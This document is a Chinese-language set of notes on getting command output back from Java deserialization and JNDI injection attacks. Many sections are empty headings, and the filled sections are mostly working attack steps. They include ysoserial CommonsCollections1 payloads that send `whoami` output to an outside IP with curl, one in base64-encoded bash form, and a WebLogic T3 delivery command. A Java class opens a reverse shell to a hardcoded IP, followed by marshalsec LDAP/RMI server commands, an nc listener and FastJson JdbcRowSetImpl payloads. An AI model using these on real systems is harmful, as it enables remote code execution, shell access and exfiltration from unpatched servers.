# Java 回显

### 回显方式
- 1、web中获取当前上下文对象（response、context、writer等）
    -  defineClass
    -  中间件
- 2、报错回显
    -  URLClassLoader抛出异常
- 3、可以出网情况
    -  Dnslog OOB
    -  JNDI注入回显
    -  RMI绑定实例
- 4、写文件

### 方式分析

#### 一、web中获取当前上下文对象（response、context、writer等）回显

##### defineClass

##### 中间件

#### 二、报错回显

 URLClassLoader抛出异常
 
#### 三、可以出网情况回显

##### HTTP OOB (受限比较大)
###### 限制条件
- 1、宿主机必须要可以访问外网
- 2、宿主机可能不包含特定命令
- 3、需要知道宿主机的系统类型

###### 具体步骤

- java -jar ysoserial.jar CommonsCollections1 "curl http://108.61.162.13:8098/p/8bfade/FPsl/`whoami`" > poc.ser (无法执行成功)

- 需要执行的命令在 http://www.jackson-t.ca/runtime-exec-payloads.html 进行处理一下

- java -jar ysoserial.jar CommonsCollections1 "bash -c {echo,Y3VybCBodHRwOi8vMTA4LjYxLjE2Mi4xMzo4MDk4L3AvZTk3YWJmL0s3RFQvYHdob2FtaWA=}|{base64,-d}|{bash,-i}" > poc.ser

- python weblogic_t3.py 10.91.198.11 7001 poc.ser

##### Dnslog OOB (和HTTP OOB类似)

##### JNDI注入回显

###### 限制条件
- 1、宿主机必须要可以访问外网
- 2、有JDK版本限制

###### 使用步骤(以FastJson为例)
```
POC
// javac TouchFile.java
import java.lang.Runtime;
import java.lang.Process;

public class TouchFile {
    static {
        try {
            Runtime rt = Runtime.getRuntime();
            String[] commands = {"bash", "-c", "bash -i >& /dev/tcp/202.182.114.212/1234 0>&1"};
            Process pc = rt.exec(commands);
            pc.waitFor();
        } catch (Exception e) {
            // do nothing
        }
    }
}
利用步骤

1、将上面的POC编译为Class
    
    javac TouchFile.java

2、使用python搭建一个临时的web服务

    python -m SimpleHTTPServer 8888

3、开启ldap服务或者rmi 服务
    
    ldap (开启ldap 服务端口)
    
    java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://202.182.114.212:8888/#TouchFile 9999
    
    rmi (开启rmi 服务端口)
    
    java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http://202.182.114.212:8888/#TouchFile 9999

4、监听端口

    nc -lvvnp 1234
    
5、Burp 发送Poc

    ldap
    
    {"e":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"f":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://202.182.114.212:9999/TouchFile","autoCommit":true}}
    
    rmi 
    
    {"e":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"f":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://202.182.114.212:9999/TouchFile","autoCommit":true}}
```

###### 原理

- 1、目标代码中调用了InitialContext.lookup(URI)，且URI为用户可控;
- 2、攻击者控制URI参数为恶意的RMI服务地址，如：rmi://hacker_rmi_server//name;
- 3、攻击者RMI服务器向目标返回一个Reference对象，Reference对象中指定某个精心构造的Factory类;
- 4、目标在进行lookup()操作时，会动态加载并实例化Factory类，接着调用factory.getObjectInstance()获取外部远程对象实例;
- 5、攻击者可以在Factory类文件的构造方法、静态代码块、getObjectInstance()方法等处写入恶意代码，达到RCE的效果;
##### RMI绑定实例

#### 四、写文件回显

#### 五、新的回显思路

##### 1、LINUX 文件描述符

###### 限制条件
- 1、如何确定文件描述符id的情况
- 2、如果没办法确定源IP和端口无法拿到回显
- 3、受网络限制
- 4、只能用于Linux环境

在LINUX环境下，可以通过文件描述符"/proc/self/fd/i"获取到网络连接，在java中我们可以直接通过文件描述符获取到一个Stream对象，对当前网络连接进行读写操作

参考:
- http://foreversong.cn/archives/1459 具体操作步骤
- https://www.cnblogs.com/web21/p/6520164.html socket 文件描述符相关原理
- http://diseng.github.io/2015/04/30/nat    nat网络穿透


### 自动化挖掘

### 参考文章
- https://github.com/feihong-cs/Java-Rce-Echo
- https://gv7.me/articles/2020/semi-automatic-mining-request-implements-multiple-middleware-echo/
- https://www.00theway.org/2020/01/17/java-god-s-eye/
- https://xz.aliyun.com/t/7307  